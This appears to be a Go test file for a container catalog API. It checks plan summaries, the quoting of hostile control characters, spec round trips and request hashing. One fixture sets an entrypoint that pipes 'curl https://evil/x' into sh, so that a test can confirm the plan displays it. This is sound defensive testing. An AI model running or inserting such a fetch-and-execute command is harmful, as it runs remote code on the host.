package api

import (
	"bytes"
	"encoding/json"
	"strconv"
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/more-than-code/bot-api-server/internal/catalog"
	"github.com/more-than-code/bot-api-server/internal/store"
)

func TestCatalogWritePlanSentences(t *testing.T) {
	sets := catalog.SetKeys{"svc": {"TOKEN", "OTHER"}, "a": {}, "b": {}}
	files := map[string]struct{}{"note.txt": {}}
	fullRaw := `{
		"kind":"service",
		"image":"nginx:1.27",
		"ports":[{"host":8080,"container":80},{"host":443,"container":443,"public":true}],
		"env_sets":["b","a"],
		"env":{"MODE":"plain-mode-value","REGION":"us"},
		"secret_env":{"OTHER":"svc.OTHER","TOKEN":"svc.TOKEN"},
		"volumes":[{"name":"data","target":"/var/lib"},{"name":"cache","target":"/cache","read_only":true}],
		"files":[{"file":"note.txt","target":"/etc/note"}],
		"command":["nginx","-g","daemon off"],
		"user":"www",
		"memory_mb":64
	}`
	full := mustPlanImage(t, "web", fullRaw, sets, files)
	got := catalogCreatePlan("Proj", "web", full)
	want := "will create image entry web in Proj: docker.io/library/nginx:1.27, service; ports 127.0.0.1:8080→80, public 443→443; env sets b, a; env MODE=plain-mode-value, REGION=us; secret_env OTHER←svc.OTHER, TOKEN←svc.TOKEN; volumes data→/var/lib, cache→/cache (ro); files note.txt→/etc/note; command nginx -g \"daemon off\"; user www; memory 64 MB"
	if got != want {
		t.Fatalf("create plan\n%s", got)
	}
	if !strings.Contains(got, "MODE=plain-mode-value") {
		t.Fatal("create plan hid an inline env value")
	}

	plain := mustPlanImage(t, "web", `{"kind":"service","image":"nginx"}`, nil, nil)
	if catalogCreatePlan("Proj", "web", plain) != "will create image entry web in Proj: docker.io/library/nginx:latest, service" {
		t.Fatalf("minimal plan %s", catalogCreatePlan("Proj", "web", plain))
	}

	job := mustPlanImage(t, "web", `{"kind":"job","image":"nginx"}`, nil, nil)
	got = catalogUpdatePlan("web", plain, job, 0)
	want = "will update image entry web: kind: service → job; restart: unless-stopped → no; healthy_after_sec: 30 → 0; timeout_sec: 0 → 600; voids 0 host approvals"
	if got != want {
		t.Fatalf("kind plan\n%s", got)
	}

	bumped := mustPlanImage(t, "web", `{"kind":"service","image":"nginx:1.27"}`, nil, nil)
	got = catalogUpdatePlan("web", plain, bumped, 2)
	want = "will update image entry web: image: docker.io/library/nginx:latest → docker.io/library/nginx:1.27; voids 2 host approvals"
	if got != want {
		t.Fatalf("image plan\n%s", got)
	}

	if catalogUpdatePlan("web", plain, plain, 0) != "will update image entry web: voids 0 host approvals" {
		t.Fatalf("unchanged plan %s", catalogUpdatePlan("web", plain, plain, 0))
	}

	modeA := mustPlanImage(t, "web", `{"kind":"service","image":"nginx","env":{"MODE":"one"}}`, nil, nil)
	modeB := mustPlanImage(t, "web", `{"kind":"service","image":"nginx","env":{"MODE":"two"}}`, nil, nil)
	got = catalogUpdatePlan("web", modeA, modeB, 1)
	want = "will update image entry web: env MODE: one → two; voids 1 host approval"
	if got != want {
		t.Fatalf("env plan\n%s", got)
	}

	if catalogDeletePlan("web", 1) != "will delete image entry web; 1 host approval and its grants are removed; running containers are not stopped" {
		t.Fatalf("delete one %s", catalogDeletePlan("web", 1))
	}
	if catalogDeletePlan("web", 0) != "will delete image entry web; 0 host approvals and its grants are removed; running containers are not stopped" {
		t.Fatalf("delete zero %s", catalogDeletePlan("web", 0))
	}
}

func TestHealthcheckPlan(t *testing.T) {
	img := mustPlanImage(t, "web", `{"kind":"service","image":"nginx","healthcheck":{"test":["CMD","hello world"]}}`, nil, nil)
	got := catalogCreatePlan("Proj", "web", img)
	want := `healthcheck CMD "hello world" interval 30 timeout 5 retries 3 start 0`
	if !strings.Contains(got, want) {
		t.Fatalf("create plan %s", got)
	}
	plain := mustPlanImage(t, "web", `{"kind":"service","image":"nginx"}`, nil, nil)
	if strings.Contains(catalogCreatePlan("Proj", "web", plain), "healthcheck") {
		t.Fatal("plan mentioned an absent healthcheck")
	}
	upd := catalogUpdatePlan("web", plain, img, 1)
	if !strings.Contains(upd, "healthcheck: none → "+want[len("healthcheck "):]) {
		t.Fatalf("update plan %s", upd)
	}
}

func TestCatalogWritePlanQuotesControlledText(t *testing.T) {
	nasty := "x; y\u2028\u202ez"
	project := "Proj" + nasty
	target := "/" + nasty
	fileTarget := "/etc/" + nasty
	files := map[string]struct{}{"note.txt": {}}
	raw, err := json.Marshal(map[string]any{
		"kind":    "service",
		"image":   "nginx",
		"env":     map[string]string{"MODE": nasty},
		"volumes": []map[string]any{{"name": "data", "target": target}},
		"files":   []map[string]any{{"file": "note.txt", "target": fileTarget}},
		"command": []string{"nginx", nasty},
	})
	if err != nil {
		t.Fatal(err)
	}
	img := mustPlanImage(t, "web", string(raw), nil, files)
	create := catalogCreatePlan(project, "web", img)
	for _, field := range []string{project, target, fileTarget, nasty} {
		if !strings.Contains(create, strconv.Quote(field)) {
			t.Fatalf("create plan missing %s\n%s", strconv.Quote(field), create)
		}
	}
	if !strings.Contains(create, "docker.io/library/nginx:latest") || strings.Contains(create, `"docker.io/library/nginx:latest"`) {
		t.Fatalf("image reference was quoted\n%s", create)
	}
	assertPlanHasNoRawControl(t, create)
	plain := mustPlanImage(t, "web", `{"kind":"service","image":"nginx"}`, nil, nil)
	update := catalogUpdatePlan("web", plain, img, 0)
	for _, field := range []string{target, fileTarget, nasty} {
		if !strings.Contains(update, strconv.Quote(field)) {
			t.Fatalf("update plan missing %s\n%s", strconv.Quote(field), update)
		}
	}
	assertPlanHasNoRawControl(t, update)
}

func TestCatalogWritePlanEntrypointAndRestart(t *testing.T) {
	shell := mustPlanImage(t, "web", `{"kind":"service","image":"nginx","entrypoint":["/bin/sh","-c","curl https://evil/x|sh"],"restart":"no"}`, nil, nil)
	got := catalogCreatePlan("Proj", "web", shell)
	if !strings.Contains(got, `entrypoint /bin/sh -c "curl https://evil/x|sh"`) {
		t.Fatalf("entrypoint %s", got)
	}
	if !strings.Contains(got, "restart no") {
		t.Fatalf("restart %s", got)
	}
	plain := mustPlanImage(t, "web", `{"kind":"service","image":"nginx"}`, nil, nil)
	if strings.Contains(catalogCreatePlan("Proj", "web", plain), "restart") {
		t.Fatal("default service listed restart")
	}
	job := mustPlanImage(t, "batch", `{"kind":"job","image":"nginx","entrypoint":["/bin/sh","-c","echo hi"]}`, nil, nil)
	got = catalogCreatePlan("Proj", "batch", job)
	if !strings.Contains(got, `entrypoint /bin/sh -c "echo hi"`) {
		t.Fatalf("job entrypoint %s", got)
	}
	if strings.Contains(got, "restart") {
		t.Fatalf("default job listed restart %s", got)
	}
}

func assertPlanHasNoRawControl(t *testing.T, plan string) {
	t.Helper()
	if strings.ContainsRune(plan, '\u2028') || strings.ContainsRune(plan, '\u202e') {
		t.Fatalf("plan contains a raw line separator or bidi override\n%s", plan)
	}
	if strings.Contains(unquotedPlan(plan), "x; y") {
		t.Fatalf("plan contains a raw semicolon from input\n%s", plan)
	}
}

func unquotedPlan(plan string) string {
	var b strings.Builder
	inQuote := false
	esc := false
	for _, r := range plan {
		if inQuote {
			if esc {
				esc = false
				continue
			}
			if r == '\\' {
				esc = true
				continue
			}
			if r == '"' {
				inQuote = false
			}
			continue
		}
		if r == '"' {
			inQuote = true
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}

func TestImageSpecForBuildRoundTrip(t *testing.T) {
	sets := catalog.SetKeys{"svc": {"TOKEN", "OTHER"}, "a": {}, "b": {}}
	files := map[string]struct{}{"note.txt": {}}
	cases := []struct {
		name  string
		raw   string
		sets  catalog.SetKeys
		files map[string]struct{}
	}{
		{"service", `{"kind":"service","image":"nginx","ports":[{"host":8080,"container":80}]}`, nil, nil},
		{"job", `{"kind":"job","image":"nginx:1.27","command":["echo","hi"],"user":"www","memory_mb":64,"timeout_sec":10}`, nil, nil},
		{"full", `{
			"kind":"service","image":"nginx:1.27",
			"ports":[{"host":8080,"container":80},{"host":443,"container":443,"public":true}],
			"env_sets":["b","a"],
			"env":{"MODE":"plain-mode-value","REGION":"us"},
			"secret_env":{"TOKEN":"svc.TOKEN","OTHER":"svc.OTHER"},
			"volumes":[{"name":"data","target":"/var/lib"},{"name":"cache","target":"/cache","read_only":true}],
			"files":[{"file":"note.txt","target":"/etc/note"}],
			"command":["nginx","-g","daemon off"],
			"user":"www","memory_mb":64
		}`, sets, files},
	}
	for _, tc := range cases {
		img := mustPlanImage(t, "web", tc.raw, tc.sets, tc.files)
		stored := catalog.SpecJSON(img)
		again, err := catalog.BuildImage("web", imageSpecForBuild([]byte(stored)), tc.sets, tc.files)
		if err != nil {
			t.Fatalf("%s rebuild %v", tc.name, err)
		}
		if catalog.SpecJSON(again) != stored || !store.SameJSON([]byte(stored), []byte(catalog.SpecJSON(again))) {
			t.Fatalf("%s round trip\n%s\n%s", tc.name, stored, catalog.SpecJSON(again))
		}
	}
}

func TestCatalogWriteRequestHash(t *testing.T) {
	spec := []byte(`{"image":"docker.io/library/nginx:latest","kind":"service"}`)
	id := uuid.MustParse("11111111-1111-1111-1111-111111111111")
	one := catalogWriteRequestHash("create", id, "web", spec)
	two := catalogWriteRequestHash("create", id, "web", spec)
	if len(one) != 32 || !bytes.Equal(one, two) {
		t.Fatal("request hash is not stable")
	}
	other := catalogWriteRequestHash("create", id, "web", []byte(`{"image":"docker.io/library/nginx:1.27","kind":"service"}`))
	if bytes.Equal(one, other) {
		t.Fatal("different spec hashed the same")
	}
	deleted := catalogWriteRequestHash("delete", id, "web", spec)
	deletedNil := catalogWriteRequestHash("delete", id, "web", nil)
	if !bytes.Equal(deleted, deletedNil) || bytes.Equal(deleted, one) {
		t.Fatal("delete hash should ignore the spec and differ from create")
	}
}

func mustPlanImage(t *testing.T, name, raw string, sets catalog.SetKeys, files map[string]struct{}) catalog.Image {
	t.Helper()
	img, err := catalog.BuildImage(name, []byte(raw), sets, files)
	if err != nil {
		t.Fatal(err)
	}
	return img
}
